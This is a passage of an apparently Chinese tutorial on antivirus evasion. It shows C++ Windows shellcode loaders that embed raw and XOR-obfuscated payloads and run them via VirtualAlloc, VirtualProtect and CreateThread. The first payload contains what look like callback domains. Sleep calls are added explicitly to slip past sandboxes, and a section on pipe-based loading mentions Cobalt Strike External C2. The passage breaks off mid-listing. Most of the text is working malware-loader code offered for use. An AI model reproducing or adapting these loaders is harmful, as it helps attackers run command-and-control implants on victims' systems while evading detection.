bytes */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x31\xc0\x6a\x40\xb4\x10\x68\x00\x10\x00\x00\x68\xff\xff\x07\x00\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x83\xc0\x40\x89\xc7\x50\x31\xc0\xb0\x70\xb4\x69\x50\x68\x64\x6e\x73\x61\x54\x68\x4c\x77\x26\x07\xff\xd5\xbb\x61\x00\x00\x00\xeb\x7b\x58\x89\xc6\x83\xef\x40\xfc\xb9\x40\x00\x00\x00\xf3\xa4\x89\xf8\x83\xe8\x40\x40\x80\xfb\x7a\x7e\x32\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x1a\xbb\x61\x00\x00\x00\x88\x18\x40\x8b\x18\x43\x88\x18\x80\xfb\x7a\x7e\x07\xbb\x61\x00\x00\x00\x88\x18\x48\x48\xbb\x61\x00\x00\x00\x88\x18\x89\xf3\x89\xc6\x54\x5b\x83\xeb\x04\x53\x6a\x00\x53\x6a\x00\x68\x48\x02\x00\x00\x6a\x10\x50\x68\x6a\xc9\x9c\xc9\xff\xd5\x85\xc0\x75\x51\x89\xf0\x48\xb3\x00\x88\x18\x40\x8b\x30\xeb\x70\xe8\x80\xff\xff\xff\x00\x61\x61\x61\x2e\x6c\x6f\x76\x65\x32\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x2e\x6c\x6f\x76\x65\x2e\x65\x73\x73\x68\x6f\x70\x77\x65\x62\x2e\x78\x79\x7a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x89\xf0\x48\x8b\x08\x41\x88\x08\x80\xf9\x5f\x7e\x07\x68\xf0\xb5\xa2\x56\xff\xd5\x68\xe8\x13\x00\x00\x68\x44\xf0\x35\xe0\xff\xd5\x89\xf0\x8b\x08\x89\xcb\xe9\x23\xff\xff\xff\x87\xfa\x5f\x8b\x47\x18\x83\xf8\x01\x75\x39\x83\xc7\x1c\x8b\x3f\x87\xde\x89\xfe\x8b\x7c\x24\x08\x31\xc9\xb1\xff\xf3\xa4\x57\x57\x57\x43\x87\xfa\x52\x57\x53\x81\xea\xff\x00\x00\x00\x52\x68\xf4\x00\x8e\xcc\xff\xd5\x5b\x5f\x5a\x3d\xff\x00\x00\x00\x7c\x07\xe9\xdf\xfe\xff\xff\x89\xd7\x81\xc7\x15\x00\x00\x00\xff\xe7\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_EXECUTE_READWRITE</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 将shellcode复制到可执行的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第三课"><a href="#第三课" class="headerlink" title="第三课"></a>第三课</h1><h2 id="内存申请的优化"><a href="#内存申请的优化" class="headerlink" title="内存申请的优化"></a>内存申请的优化</h2><p>在申请内存页时，一定要把控好属性，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 增加异或代码 */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i++)&#123;</span><br><span class="line">    buf[i] ^= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p><code>InterlockedXorRelease</code>函数可以用于两个值的异或运算，最重要的一点就是，它的操作是原子的，也就是可以达到线程同步。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinBase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 增加异或代码 */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i++)&#123;</span><br><span class="line">    Sleep(<span class="number">50</span>);</span><br><span class="line">    _InterlockedXor8(buf+i,<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第四课"><a href="#第四课" class="headerlink" title="第四课"></a>第四课</h1><h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><p><strong>分离免杀：将恶意代码放置在程序本身之外的一种加载方式。</strong></p><p>前面三课主要围绕着程序本身的加载，后面的课程将围绕网络、数据共享的方式去展开</p><h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>何为管道：<strong>管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</strong></p><p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，<strong>一般管道是一个公开的内核对象，所有进程都可以访问。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 